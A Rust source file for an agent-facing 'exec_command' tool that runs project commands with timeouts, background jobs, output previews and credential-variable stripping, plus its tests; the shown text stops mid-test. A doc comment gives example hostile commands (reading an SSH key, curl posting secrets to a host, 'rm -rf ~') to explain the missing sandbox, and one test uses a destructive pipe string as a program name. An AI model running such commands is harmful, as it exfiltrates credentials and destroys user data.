//! `exec_command`: run a project command where the project is.
//!
//! # This is not a sandbox, and nothing here pretends otherwise
//!
//! Design doc section 18. Path validation protects `read_file` and
//! `apply_patch`; it protects nothing here, because a command can go
//! wherever the user it runs as can go:
//!
//! ```text
//! cat ~/.ssh/id_ed25519
//! curl -d @secrets https://somewhere
//! rm -rf ~
//! ```
//!
//! There is deliberately **no deny list in this phase**. A list of
//! forbidden program names is trivially stepped around — `env claude`,
//! `/usr/bin/claude`, a wrapper script — and its real effect would be to
//! make the tool look policed when it is not. False confidence is worse
//! than none, and the design document says so in as many words: *command
//! parser 不是 sandbox*.
//!
//! What actually makes this safe is phase 5's work, not phase 2's: a
//! dedicated Unix user (`ccrun`) on the Runtime Node with access to the
//! project and nothing else — no sudo, no ssh key, no Claude credential,
//! no browser profile — plus filesystem ACLs and the network policy of
//! section 19. Until that exists, `exec_command` is exactly as trusted as
//! the account the runtime runs as, and the design document already calls
//! a dedicated runtime identity a hard gate before real daily use.
//!
//! The one thing this phase does enforce is the core invariant: no
//! `ANTHROPIC_*` or `CLAUDE_*` variable is passed to a child. The home
//! machine holds no Claude credential and must not learn one through a
//! command ccnm ran.
//!
//! # argv, or one shell line
//!
//! `cmd` is a list. There is no shell, so there is no quoting anywhere in
//! ccnm to get wrong, and the audit line is exactly what ran.
//!
//! `shell` (P37) is the other way in: one line, run as `bash -c <line>`,
//! for what a model writes as a matter of course -- `cd sub && make`,
//! `cargo test 2>&1 | tail -50`. It widens nothing. A model could always
//! send `["bash", "-c", line]` itself, and this is exactly that argv: the
//! same gate, the same confirmation, the same sandbox wrapping it.
//!
//! bash and not `sh`, and no falling back to `sh` when bash is missing.
//! Claude Code's Bash tool runs the user's bash or zsh (2.1.273 refuses to
//! start without one), so bash is the dialect models write; on Debian `sh`
//! is dash, where `[[ ]]`, `source` and `set -o pipefail` do something else
//! or nothing, and a line that quietly means something different is worse
//! than a refusal naming the missing program.
//!
//! # Output
//!
//! All of it is written to the session's retention directory on the home
//! machine. What comes back is a preview — the head and the tail, because
//! the first compiler error and the final summary are both worth more than
//! the middle — plus an `output_ref` for `read_output` to page through.
//!
//! # In the background
//!
//! `run_in_background` (P41) returns the `output_ref` at once and leaves the
//! command to a thread that waits for it and then records how it ended
//! ([`jobs::Status`]). Nothing else about the command differs: the same gate
//! let it start, the same sandbox wraps it, the same retention keeps what it
//! writes. What is new is that it has no deadline unless `timeout_ms` gives
//! one, so something else has to end it -- `stop_command`, or the server
//! when its session ends ([`jobs::Jobs::stop_all`]).

use std::path::Path;
use std::sync::Arc;
use std::time::Duration;

use rmcp::schemars;
use serde::{Deserialize, Serialize};

use crate::error::{Error, ErrorCode, Result};
use crate::mcp::jobs::{self, Jobs, Stop};
use crate::mcp::path;
use crate::mcp::retention::{Output, Run};
use crate::mcp::sandbox::{self, Sandbox};
use crate::mcp::truncate_bytes;
use crate::process::{Cmd, spawn_captured};

/// Wall clock a command gets when the caller does not say.
pub const DEFAULT_TIMEOUT_MS: u64 = 120_000;
/// Ceiling on `timeout_ms`. Ten minutes is a long build; anything longer
/// wants `run_in_background`.
pub const MAX_TIMEOUT_MS: u64 = 600_000;
/// Bytes of output returned inline when the caller does not say.
pub const DEFAULT_PREVIEW_BYTES: usize = 4 * 1024;
/// Ceiling on `preview_bytes` (design doc section 15).
pub const MAX_PREVIEW_BYTES: usize = 16 * 1024;

/// Arguments of `exec_command`.
#[derive(Debug, Clone, Default, Deserialize, schemars::JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct ExecCommandArgs {
    /// Program and arguments, e.g. `["cargo", "test", "--lib"]`. Not a
    /// shell line: no pipes, redirection or globs. Give this or `shell`.
    #[serde(default)]
    pub cmd: Vec<String>,
    /// One shell line, run with `bash -c`, e.g. `cargo test 2>&1 | tail -50`.
    /// Give this or `cmd`.
    #[serde(default)]
    pub shell: Option<String>,
    /// Directory to run in, relative to the workspace root. Default: the root.
    #[serde(default)]
    pub cwd: Option<String>,
    /// Kill the command after this long. Default 120000, max 600000. In the
    /// background there is no limit unless this is given.
    #[serde(default)]
    #[schemars(range(min = 1, max = 600_000))]
    pub timeout_ms: Option<u64>,
    /// Bytes of output to return inline. Default 4096, max 16384. The rest
    /// stays on the Runtime Node; use read_output to page through it.
    #[serde(default)]
    #[schemars(range(min = 0, max = 16_384))]
    pub preview_bytes: Option<u32>,
    /// Return at once with the output_ref instead of waiting for the command
    /// to end. read_output shows its output as it grows and can wait for it
    /// to finish; stop_command stops it; it is stopped when the session ends.
    #[serde(default)]
    pub run_in_background: bool,
}

/// What one command did. No output beyond the preview, which is in
/// `content[0].text`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ExecResult {
    #[serde(skip)]
    pub text: String,
    /// What actually ran, as one line, for a human reading a log: the
    /// `shell` line as given, or `cmd` joined with spaces -- not quoted, so
    /// that one is not a shell command.
    pub command: String,
    /// Workspace-relative directory it ran in; `.` for the root.
    pub cwd: String,
    /// `None` when the command was killed, which for a timeout it was.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub exit_code: Option<i32>,
    pub timed_out: bool,
    pub duration_ms: u64,
    pub stdout_bytes: u64,
    pub stderr_bytes: u64,
    /// Hand this to `read_output` for the whole thing.
    pub output_ref: String,
    /// The preview left something out.
    pub truncated: bool,
    /// Still running in the background: none of the numbers above are final.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub background: bool,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub notes: Vec<String>,
}

/// What to say when the directory a session works in is no longer there.
///
/// Never the absolute path: the server does not reveal where the
/// workspace lives (design doc section 17), and it is not what anyone
/// needs anyway. What they need is that this session cannot be saved by
/// retrying -- its root was resolved when it started -- and the two
/// commands that make a session with the right one.
pub(crate) fn workspace_gone(rel: &str) -> String {
    let what = if rel == "." {
        "the workspace root".to_string()
    } else {
        format!("{rel}, and the workspace root it is under,")
    };
    format!(
        "{what} is not on the runtime machine any more; it was there when this session started\nthe project was moved, renamed or deleted, or its disk is gone\na session cannot be repointed: end it and start another (ccnm stop <workspace>, then ccnm run <workspace>)"
    )
}

/// Run `args.cmd` or `args.shell` under `root`, retaining its output under
/// `state`.
pub fn exec_command(
    root: &Path,
    session: &str,
    state: &Path,
    args: &ExecCommandArgs,
) -> Result<ExecResult> {
    exec_command_in(
        crate::provider::AgentProvider::Claude,
        root,
        &Arc::new(Output::new(state, session)),
        args,
        Running {
            jobs: &Jobs::new(),
            stop: Arc::default(),
            sandbox: None,
        },
    )
}

/// What a command runs under besides its arguments.
pub(crate) struct Running<'a> {
    /// The server's registry, which a command joins for as long as it runs.
    pub jobs: &'a Arc<Jobs>,
    /// How the call running it stops it when the client cancels.
    pub stop: Arc<Stop>,
    /// The workspace's OS sandbox when its config asks for one
    /// (`exec_sandbox = "codex"`, P33); the command then runs behind
    /// [`Sandbox::wrap`] and the result says so.
    pub sandbox: Option<&'a Sandbox>,
}

pub(crate) fn exec_command_in(
    provider: crate::provider::AgentProvider,
    root: &Path,
    output: &Arc<Output>,
    args: &ExecCommandArgs,
    running: Running<'_>,
) -> Result<ExecResult> {
    let Running {
        jobs,
        stop,
        sandbox,
    } = running;
    let (argv, command) = match (args.cmd.is_empty(), args.shell.as_deref()) {
        (false, Some(_)) => {
            return Err(Error::invalid_args(
                "pass cmd or shell, not both: cmd runs a program directly, shell runs one line with bash -c",
            ));
        }
        (true, None) => {
            return Err(Error::invalid_args(
                "cmd is empty; pass the program and its arguments, e.g. [\"cargo\", \"test\"], or one shell line in shell",
            ));
        }
        (false, None) => (args.cmd.clone(), args.cmd.join(" ")),
        (true, Some(line)) => {
            if line.trim().is_empty() {
                return Err(Error::invalid_args("shell is empty"));
            }
            (
                vec![SHELL.to_string(), "-c".to_string(), line.to_string()],
                line.to_string(),
            )
        }
    };
    let field = if args.shell.is_some() { "shell" } else { "cmd" };
    for part in &argv {
        if part.contains('\0') {
            return Err(Error::invalid_args(format!("{field} contains a NUL byte")));
        }
    }
    // Over the ceiling is refused, not quietly clamped (P44): a caller that
    // asked for 27 hours and got ten minutes goes on believing it has 27
    // hours. Clamping is fine where the answer is only smaller than asked
    // for -- a short read -- but this one decides when a command is killed.
    let timeout_ms = match (args.timeout_ms, args.run_in_background) {
        (Some(0), _) => return Err(Error::invalid_args("timeout_ms must be at least 1")),
        (Some(ms), _) if ms > MAX_TIMEOUT_MS => {
            return Err(Error::invalid_args(format!(
                "timeout_ms is at most {MAX_TIMEOUT_MS}; for longer than that use run_in_background, which has no limit unless you give one"
            )));
        }
        (Some(ms), _) => Some(ms),
        (None, false) => Some(DEFAULT_TIMEOUT_MS),
        (None, true) => None,
    };
    let preview_bytes = match args.preview_bytes {
        Some(n) if n as usize > MAX_PREVIEW_BYTES => {
            return Err(Error::invalid_args(format!(
                "preview_bytes is at most {MAX_PREVIEW_BYTES}; the rest of the output stays on the Runtime Node, read it with read_output"
            )));
        }
        Some(n) => n as usize,
        None => DEFAULT_PREVIEW_BYTES,
    };

    let (cwd_rel, cwd_abs) = match args.cwd.as_deref().map(str::trim) {
        None | Some("") | Some(".") | Some("./") => (".".to_string(), root.to_path_buf()),
        Some(raw) => {
            let resolved = path::resolve_read(root, raw)?;
            if !resolved.abs().is_dir() {
                return Err(Error::invalid_args(format!(
                    "{} is not a directory",
                    resolved.rel()
                )));
            }
            (resolved.rel().to_string(), resolved.abs().to_path_buf())
        }
    };

    let ticket = jobs.admit(args.run_in_background, Arc::clone(&stop))?;
    if stop.reason().is_some() {
        return Err(Error::invalid_args(
            "the call was cancelled before the command started, so it was not run",
        ));
    }
    let (run, stdout, stderr) = output.begin()?;
    ticket.name(&run.reference);
    let mut cmd = Cmd::new(&argv[0])
        .args(&argv[1..])
        .cwd(&cwd_abs)
        .timeout(timeout_ms.map_or(Duration::MAX, Duration::from_millis));
    let _ = provider; // Runtime protection covers all known Agents, not this selection.
    cmd = crate::safety::environment::runtime_child(cmd);
    if let Some(sandbox) = sandbox {
        if !cwd_abs.is_dir() {
            return Err(Error::new(
                ErrorCode::WrongWorkspace,
                workspace_gone(&cwd_rel),
            ));
        }
        // Inside the wrapper a missing program fails in the sandbox
        // launcher and would come back as a command result with exit 71;
        // bare, it is a dependency error. Keep it the dependency error.
        if sandbox::locate(&argv[0], &cwd_abs, std::env::var_os("PATH").as_deref()).is_none() {
            return Err(missing_program(&argv[0], args.shell.is_some()));
        }
        cmd = sandbox.wrap(cmd, &cwd_abs);
    }
    let started = spawn_captured(&cmd, stdout, stderr).map_err(|e| {
        if !e.message().starts_with("cannot spawn") {
            return e;
        }
        // With the sandbox on, the program that failed to start is the
        // wrapper: the command itself was located above.
        if let Some(sandbox) = sandbox {
            return Error::dependency(format!(
                "the exec_command sandbox cannot start: codex_bin {} is not runnable on the Runtime Node",
                sandbox.codex_bin().display()
            ));
        }
        // `spawn` fails with the same ENOENT for two different reasons:
        // the program is not there, or the directory it would run in is
        // not there. Blaming the program either way produces the most
        // confidently wrong message this server has ever printed --
        // "/bin/echo is not installed on the Runtime Node" -- and
        // sends whoever reads it looking for a missing echo.
        //
        // It happens: a session's root is fixed when the session starts,
        // so moving or deleting the project out from under a running
        // session leaves exactly this. Check before accusing.
        if !cwd_abs.is_dir() {
            return Error::new(ErrorCode::WrongWorkspace, workspace_gone(&cwd_rel));
        }
        missing_program(&argv[0], args.shell.is_some())
    })?;
    stop.attach(started.stopper());

    let mut notes = Vec::new();
    if sandbox.is_some() {
        notes.push(sandbox::NOTE.to_string());
    }
    if args.run_in_background {
        return background(
            command, cwd_rel, timeout_ms, output, run, started, ticket, stop, notes,
        );
    }
    let captured = started.wait()?;
    let per_stream = output.limits().per_stream;
    if captured.stdout_bytes > per_stream || captured.stderr_bytes > per_stream {
        notes.push(format!(
            "the command produced more than {} on one stream; the retained copy stops there",
            bytes_label(per_stream)
        ));
    }
    if captured.stopped {
        notes.push(match stop.reason() {
            Some(jobs::StopReason::SessionEnded) => {
                "the command was stopped because its session ended".to_string()
            }
            _ => "the command was stopped because the call running it was cancelled".to_string(),
        });
    }
    let result = build(command, cwd_rel, &run, &captured, preview_bytes, notes);
    output.finish(&run);
    drop(ticket);
    Ok(result)
}

/// Leave a started command to a thread that waits for it, and say so.
///
/// The thread keeps the run (so its lock says "in progress" for as long as
/// the command lives) and the ticket (so the server, ending, waits until the
/// final status is written). Its status is on disk before the reference is
/// handed out, so no reader ever sees a background run without one.
#[allow(clippy::too_many_arguments)]
fn background(
    command: String,
    cwd: String,
    timeout_ms: Option<u64>,
    output: &Arc<Output>,
    run: Run,
    started: crate::process::Started,
    ticket: jobs::Ticket,
    stop: Arc<Stop>,
    notes: Vec<String>,
) -> Result<ExecResult> {
    let mut status = jobs::Status::started(&command, timeout_ms);
    let stopper = started.stopper();
    let recorded = status.write(&run.dir);
    let reference = run.reference.clone();
    let output = Arc::clone(output);
    let waiter = std::thread::Builder::new()
        .name("ccnm-background".into())
        .spawn(move || {
            let captured = started.wait();
            match captured {
                Ok(captured) => {
                    status.end(&captured, stop.reason());
                    if let Err(error) = status.write(&run.dir) {
                        tracing::warn!(%error, run = %run.reference, "cannot record how a background command ended");
                    }
                }
                Err(error) => {
                    tracing::warn!(%error, run = %run.reference, "cannot wait for a background command");
                }
            }
            output.finish(&run);
            drop(run);
            drop(ticket);
        });
    if let Err(error) = recorded.and(waiter.map(drop).map_err(|e| {
        Error::internal("cannot start a thread to wait for a background command").with_source(e)
    })) {
        // Nobody will report on it, so it must not run. One attempt: without
        // a thread waiting, stopping cannot see it finish.
        stopper.stop(Duration::ZERO, Duration::ZERO);
        return Err(error);
    }

    let limit = timeout_ms.map_or(String::new(), |ms| format!("; it is killed after {ms} ms"));
    let mut text = format!(
        "$ {command}\nrunning in the background as output_ref {reference}{limit}\n[read_output with this output_ref shows what it has written so far, and with wait_ms waits for it to finish; stop_command stops it; it is stopped when this session ends]"
    );
    for note in &notes {
        text.push_str("\n[");
        text.push_str(note);
        text.push(']');
    }
    Ok(ExecResult {
        text,
        command,
        cwd,
        exit_code: None,
        timed_out: false,
        duration_ms: 0,
        stdout_bytes: 0,
        stderr_bytes: 0,
        output_ref: reference,
        truncated: false,
        background: true,
        notes,
    })
}

/// The program `shell` runs its line with. Found on PATH like any `cmd`.
const SHELL: &str = "bash";

/// A program that could not be started, named. For `shell` the program is
/// bash, and the way round a Runtime without it is `cmd`.
fn missing_program(program: &str, via_shell: bool) -> Error {
    let mut message =
        format!("{program} is not installed on the Runtime Node, or is not on its PATH");
    if via_shell {
        message.push_str("; shell runs its line with bash -c, so without bash pass the program and its arguments in cmd instead");
    }
    Error::dependency(message)
}

/// `64 MiB` for the real limit, bytes for the small ones tests use.
fn bytes_label(bytes: u64) -> String {
    const MIB: u64 = 1024 * 1024;
    if bytes >= MIB && bytes.is_multiple_of(MIB) {
        format!("{} MiB", bytes / MIB)
    } else {
        format!("{bytes} B")
    }
}

/// Every `ANTHROPIC_*` and `CLAUDE_*` name in this process's environment.
///
/// The core invariant is that the Runtime Node holds no Claude credential
/// (section 6). It also must not hand one to a command it runs: the ssh
/// session that started this server could have carried one in, and a
/// child that inherited it could use it or log it.
#[cfg(test)]
fn strip_names<I>(names: I) -> Vec<std::ffi::OsString>
where
    I: Iterator<Item = std::ffi::OsString>,
{
    crate::safety::environment::strip_names(names)
}

fn build(
    command: String,
    cwd: String,
    retention: &Run,
    captured: &crate::process::Captured,
    preview_bytes: usize,
    mut notes: Vec<String>,
) -> ExecResult {
    let duration_ms = u64::try_from(captured.duration.as_millis()).unwrap_or(u64::MAX);

    // stderr first when there is any: a failing command's reason is
    // there, and a preview that spends its budget on stdout buries it.
    let (stderr_preview, stderr_cut) = preview(&retention.stderr(), preview_bytes / 2);
    let stdout_room = preview_bytes.saturating_sub(stderr_preview.len());
    let (stdout_preview, stdout_cut) = preview(&retention.stdout(), stdout_room);

    let status = match (captured.timed_out, captured.exit_code) {
        (true, _) => format!("timed out after {duration_ms} ms"),
        (false, Some(0)) => format!("ok in {duration_ms} ms"),
        (false, Some(code)) => format!("exit {code} in {duration_ms} ms"),
        (false, None) => format!("killed after {duration_ms} ms"),
    };
    let mut text = format!(
        "$ {command}\n{status}, {} B stdout, {} B stderr\n",
        captured.stdout_bytes, captured.stderr_bytes
    );
    if !stdout_preview.is_empty() {
        text.push_str("--- stdout\n");
        text.push_str(&stdout_preview);
        if !stdout_preview.ends_with('\n') {
            text.push('\n');
        }
    }
    if !stderr_preview.is_empty() {
        text.push_str("--- stderr\n");
        text.push_str(&stderr_preview);
        if !stderr_preview.ends_with('\n') {
            text.push('\n');
        }
    }
    let truncated = stdout_cut || stderr_cut;
    text.push_str(&if truncated {
        format!(
            "[output shortened; read_output with output_ref {} for all of it]",
            retention.reference
        )
    } else {
        format!("[output_ref {}]", retention.reference)
    });
    if captured.timed_out {
        notes.push("the command was killed on timeout; what it had written is retained".into());
    }
    for note in &notes {
        text.push_str("\n[");
        text.push_str(note);
        text.push(']');
    }

    ExecResult {
        text,
        command,
        cwd,
        exit_code: captured.exit_code,
        timed_out: captured.timed_out,
        duration_ms,
        stdout_bytes: captured.stdout_bytes,
        stderr_bytes: captured.stderr_bytes,
        output_ref: retention.reference.clone(),
        truncated,
        background: false,
        notes,
    }
}

/// Head and tail of a file, up to `budget` bytes.
///
/// Not just the tail. A failing build puts the first error at the top and
/// the summary at the bottom, and a preview that keeps only one of them
/// sends the reader to `read_output` for something it could have said.
fn preview(path: &Path, budget: usize) -> (String, bool) {
    if budget == 0 {
        return (String::new(), path.metadata().is_ok_and(|m| m.len() > 0));
    }
    let Ok(bytes) = std::fs::read(path) else {
        return (String::new(), false);
    };
    if bytes.is_empty() {
        return (String::new(), false);
    }
    let text = String::from_utf8_lossy(&bytes);
    if text.len() <= budget {
        return (text.into_owned(), false);
    }
    let head_budget = budget / 2;
    let head = truncate_bytes(&text, head_budget);
    let tail_start = text.len() - (budget - head.len());
    let mut tail_start = tail_start.min(text.len());
    while tail_start < text.len() && !text.is_char_boundary(tail_start) {
        tail_start += 1;
    }
    let elided = tail_start.saturating_sub(head.len());
    (
        format!("{head}\n… {elided} B elided …\n{}", &text[tail_start..]),
        true,
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::error::ErrorCode;
    use crate::mcp::retention::Limits;
    use ccnm_testdir::TestDir;
    use std::fs;
    use std::path::PathBuf;

    struct Fixture {
        root: PathBuf,
        state: PathBuf,
        _dir: TestDir,
    }

    fn fixture(name: &str) -> Fixture {
        let dir = std::env::temp_dir().join(format!("ccnm-exec-{}-{name}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(dir.join("root/sub")).unwrap();
        fs::create_dir_all(dir.join("state")).unwrap();
        fs::write(dir.join("root/marker.txt"), "in the root\n").unwrap();
        fs::write(dir.join("root/sub/marker.txt"), "in the subdirectory\n").unwrap();
        Fixture {
            root: fs::canonicalize(dir.join("root")).unwrap(),
            state: fs::canonicalize(dir.join("state")).unwrap(),
            _dir: TestDir::adopt(dir),
        }
    }

    fn run(f: &Fixture, cmd: &[&str]) -> ExecResult {
        exec_command(
            &f.root,
            "s-test",
            &f.state,
            &ExecCommandArgs {
                cmd: cmd.iter().map(|s| s.to_string()).collect(),
                ..Default::default()
            },
        )
        .unwrap()
    }

    fn fails(f: &Fixture, args: ExecCommandArgs) -> Error {
        match exec_command(&f.root, "s-test", &f.state, &args) {
            Err(e) => e,
            Ok(r) => panic!("expected a refusal, got {}", r.text),
        }
    }

    #[test]
    fn a_command_runs_in_the_workspace_and_reports_what_happened() {
        let f = fixture("basic");
        let r = run(&f, &["cat", "marker.txt"]);
        assert_eq!(r.exit_code, Some(0));
        assert!(!r.timed_out);
        assert_eq!(r.cwd, ".");
        assert_eq!(r.command, "cat marker.txt");
        assert_eq!(r.stdout_bytes, 12);
        assert_eq!(r.stderr_bytes, 0);
        assert!(!r.truncated);
        assert!(r.text.contains("--- stdout\nin the root\n"), "{}", r.text);
        assert!(r.text.contains("ok in "), "{}", r.text);
        assert!(
            r.text.contains(&format!("[output_ref {}]", r.output_ref)),
            "{}",
            r.text
        );
    }

    #[test]
    fn a_failing_command_is_a_result_not_an_error() {
        let f = fixture("failing");
        let r = run(&f, &["sh", "-c", "echo out; echo bad >&2; exit 3"]);
        assert_eq!(r.exit_code, Some(3));
        assert_eq!(r.stdout_bytes, 4);
        assert_eq!(r.stderr_bytes, 4);
        assert!(r.text.contains("exit 3 in"), "{}", r.text);
        assert!(r.text.contains("--- stderr\nbad"), "{}", r.text);
    }

    #[test]
    fn cwd_goes_through_the_same_path_policy() {
        let f = fixture("cwd");
        let r = exec_command(
            &f.root,
            "s",
            &f.state,
            &ExecCommandArgs {
                cmd: vec!["cat".into(), "marker.txt".into()],
                cwd: Some("sub".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(r.cwd, "sub");
        assert!(r.text.contains("in the subdirectory"), "{}", r.text);

        for (cwd, code) in [
            ("../", ErrorCode::Policy),
            ("/etc", ErrorCode::Policy),
            ("~/", ErrorCode::Policy),
            ("nope", ErrorCode::InvalidArgs),
            ("marker.txt", ErrorCode::InvalidArgs),
        ] {
            let e = fails(
                &f,
                ExecCommandArgs {
                    cmd: vec!["true".into()],
                    cwd: Some(cwd.into()),
                    ..Default::default()
                },
            );
            assert_eq!(e.code(), code, "{cwd} -> {e}");
        }
    }

    #[test]
    fn there_is_no_shell_so_a_shell_line_is_one_program_name() {
        let f = fixture("noshell");
        // The whole point: this is a program called `echo hi | rm -rf /`,
        // which does not exist, rather than two commands and a pipe.
        let e = fails(
            &f,
            ExecCommandArgs {
                cmd: vec!["echo hi | rm -rf /".into()],
                ..Default::default()
            },
        );
        assert_eq!(e.code(), ErrorCode::Dependency);
        assert!(e.message().contains("not installed"), "{e}");
        // And an argument that looks like a redirect is just an argument.
        let r = run(&f, &["echo", "a", ">", "b"]);
        assert!(r.text.contains("a > b"), "{}", r.text);
        assert!(
            !f.root.join("b").exists(),
            "a file was redirected into being"
        );
    }

    /// `spawn` fails with the same ENOENT whether the program is missing
    /// or the directory it would run in is. Blaming the program produced
    /// the most confidently wrong message this server has printed --
    /// "/bin/echo is not installed on the Runtime Node" -- on a
    /// session whose project had been moved out from under it.
    #[test]
    fn a_vanished_workspace_is_not_reported_as_a_missing_program() {
        let f = fixture("vanished");
        assert_eq!(run(&f, &["/bin/echo", "hi"]).exit_code, Some(0));

        // The way it happens for real: someone moves the project.
        let moved = f.root.with_extension("moved");
        let _ = fs::remove_dir_all(&moved);
        fs::rename(&f.root, &moved).unwrap();

        let e = exec_command(
            &f.root,
            "s-test",
            &f.state,
            &ExecCommandArgs {
                cmd: vec!["/bin/echo".into(), "hi".into()],
                ..Default::default()
            },
        )
        .unwrap_err();
        assert_eq!(e.code(), ErrorCode::WrongWorkspace);
        assert!(
            !e.message().contains("not installed"),
            "/bin/echo is installed; the workspace is what is missing: {e}"
        );
        assert!(e.message().contains("not on the runtime machine"), "{e}");
        assert!(e.message().contains("ccnm stop"), "{e}");
        // The absolute path is never revealed, gone or not.
        assert!(!e.message().contains(&moved.display().to_string()), "{e}");
    }

    #[test]
    fn every_anthropic_and_claude_name_is_stripped_and_nothing_else_is() {
        let names: Vec<std::ffi::OsString> = [
            "ANTHROPIC_API_KEY",
            "ANTHROPIC_BASE_URL",
            "CLAUDE_CODE_OAUTH_TOKEN",
            "CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST",
            "PATH",
            "HOME",
            "MY_ANTHROPIC_KEY",
            "CLAUDECODE",
        ]
        .into_iter()
        .map(std::ffi::OsString::from)
        .collect();
        let stripped: Vec<String> = strip_names(names.into_iter())
            .into_iter()
            .map(|s| s.to_string_lossy().into_owned())
            .collect();
        assert_eq!(
            stripped,
            [
                "ANTHROPIC_API_KEY",
                "ANTHROPIC_BASE_URL",
                "CLAUDE_CODE_OAUTH_TOKEN",
                "CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST",
            ]
        );
        // The prefix is a prefix, not a substring: a variable of the
        // user's own that merely mentions Anthropic keeps working, and
        // CLAUDECODE has no underscore so it is not one of ours.
    }

    #[test]
    fn a_child_inherits_the_rest_of_the_environment() {
        // The counterpart of the stripping: this is not a clean room, and
        // a command that needs PATH to find cargo has to get it.
        let f = fixture("env");
        let r = run(&f, &["sh", "-c", "test -n \"$PATH\" && echo has-path"]);
        assert_eq!(r.exit_code, Some(0));
        assert!(r.text.contains("has-path"), "{}", r.text);
    }

    #[test]
    fn a_slow_command_is_killed_and_what_it_wrote_is_kept() {
        let f = fixture("timeout");
        let started = std::time::Instant::now();
        let r = exec_command(
            &f.root,
            "s",
            &f.state,
            &ExecCommandArgs {
                cmd: vec!["sh".into(), "-c".into(), "echo early; sleep 30".into()],
                timeout_ms: Some(400),
                ..Default::default()
            },
        )
        .unwrap();
        assert!(r.timed_out);
        assert_eq!(r.exit_code, None);
        assert!(
            started.elapsed() < Duration::from_secs(10),
            "{:?}",
            started.elapsed()
        );
        assert!(r.text.contains("timed out after"), "{}", r.text);
        assert!(
            r.text.contains("early"),
            "what it wrote before the kill: {}",
            r.text
        );
        assert!(
            r.notes.iter().any(|n| n.contains("killed on timeout")),
            "{:?}",
            r.notes
        );
    }

    #[test]
    fn long_output_is_retained_whole_and_previewed_at_both_ends() {
        let f = fixture("long");
        let r = exec_command(
            &f.root,
            "s",
            &f.state,
            &ExecCommandArgs {
                cmd: vec![
                    "sh".into(),
                    "-c".into(),
                    "i=0; while [ $i -lt 4000 ]; do echo line $i; i=$((i+1)); done".into(),
                ],
                preview_bytes: Some(2048),
                ..Default::default()
            },
        )
        .unwrap();
        assert!(r.stdout_bytes > 30_000, "{}", r.stdout_bytes);
        assert!(r.truncated);
        assert!(
            r.text.len() < 4096,
            "the preview blew its budget: {}",
            r.text.len()
        );
        // Both ends, so neither the first error nor the summary is lost.
        assert!(r.text.contains("line 0\n"), "{}", r.text);
        assert!(r.text.contains("line 3999"), "{}", r.text);
        assert!(r.text.contains("B elided"), "{}", r.text);
        assert!(r.text.contains("read_output with output_ref"), "{}", r.text);

        // All of it is on disk, exactly as produced.
        let path = f
            .state
            .join("sessions/s/output")
            .join(&r.output_ref)
            .join("stdout");
        let retained = fs::read_to_string(&path).unwrap();
        assert_eq!(retained.len() as u64, r.stdout_bytes);
        assert!(retained.starts_with("line 0\n"));
        assert!(retained.ends_with("line 3999\n"));
    }

    #[test]
    fn the_preview_never_splits_a_character() {
        let f = fixture("utf8");
        let r = exec_command(
            &f.root,
            "s",
            &f.state,
            &ExecCommandArgs {
                cmd: vec![
                    "sh".into(),
                    "-c".into(),
                    "printf '中%.0s' $(seq 1 4000)".into(),
                ],
                preview_bytes: Some(101),
                ..Default::default()
            },
        )
        .unwrap();
        // A String would have panicked on a bad boundary before this line.
        assert!(r.truncated);
        assert!(r.text.contains('中'));
    }

    #[test]
    fn bad_arguments_are_refused_before_anything_runs() {
        let f = fixture("badargs");
        let e = fails(&f, ExecCommandArgs::default());
        assert_eq!(e.code(), ErrorCode::InvalidArgs);
        assert!(e.message().contains("cmd is empty"), "{e}");

        let e = fails(
            &f,
            ExecCommandArgs {
                cmd: vec!["echo".into(), "a\0b".into()],
                ..Default::default()
            },
        );
        assert_eq!(e.code(), ErrorCode::InvalidArgs);

        let e = fails(
            &f,
            ExecCommandArgs {
                cmd: vec!["true".into()],
                timeout_ms: Some(0),
                ..Default::default()
            },
        );
        assert_eq!(e.code(), ErrorCode::InvalidArgs);

        // 超上限是**拒**，不是钳（P44）。钳的话要 27 小时的调用方会拿着一个
        // 十分钟的命令，以为自己有 27 小时。
        let e = fails(
            &f,
            ExecCommandArgs {
                cmd: vec!["true".into()],
                timeout_ms: Some(MAX_TIMEOUT_MS + 1),
                ..Default::default()
            },
        );
        assert_eq!(e.code(), ErrorCode::InvalidArgs);
        assert!(e.message().contains("run_in_background"), "{e}");

        let e = fails(
            &f,
            ExecCommandArgs {
                cmd: vec!["true".into()],
                preview_bytes: Some(MAX_PREVIEW_BYTES as u32 + 1),
                ..Default::default()
            },
        );
        assert_eq!(e.code(), ErrorCode::InvalidArgs);
        assert!(e.message().contains("read_output"), "{e}");
    }

    fn shell(f: &Fixture, line: &str) -> ExecResult {
        exec_command(
            &f.root,
            "s-test",
            &f.state,
            &ExecCommandArgs {
                shell: Some(line.to_string()),
                ..Default::default()
            },
        )
        .unwrap()
    }

    #[test]
    fn a_shell_line_runs_with_bash() {
        let f = fixture("shell");
        let r = shell(&f, "cat marker.txt | tr a-z A-Z && echo done > out.txt");
        assert_eq!(r.exit_code, Some(0), "{}", r.text);
        assert!(r.text.contains("--- stdout\nIN THE ROOT\n"), "{}", r.text);
        assert_eq!(
            fs::read_to_string(f.root.join("out.txt")).unwrap(),
            "done\n"
        );
        // The log line is the line that was asked for.
        assert_eq!(
            r.command,
            "cat marker.txt | tr a-z A-Z && echo done > out.txt"
        );
        assert!(r.text.starts_with("$ cat marker.txt | tr"), "{}", r.text);

        // bash, not whatever sh is: `[[ ]]` and pipefail are bash.
        let r = shell(
            &f,
            "set -o pipefail; false | true; [[ $? == 1 ]] && echo bash",
        );
        assert!(r.text.contains("--- stdout\nbash\n"), "{}", r.text);
    }

    #[test]
    fn a_shell_line_keeps_cwd_timeout_and_exit_status() {
        let f = fixture("shell-rest");
        let r = exec_command(
            &f.root,
            "s",
            &f.state,
            &ExecCommandArgs {
                shell: Some("cat marker.txt; exit 4".into()),
                cwd: Some("sub".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!((r.cwd.as_str(), r.exit_code), ("sub", Some(4)));
        assert!(r.text.contains("in the subdirectory"), "{}", r.text);

        let r = exec_command(
            &f.root,
            "s",
            &f.state,
